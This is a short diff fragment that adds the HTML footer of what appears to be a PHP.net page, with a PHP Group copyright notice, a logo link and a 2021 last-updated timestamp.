+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
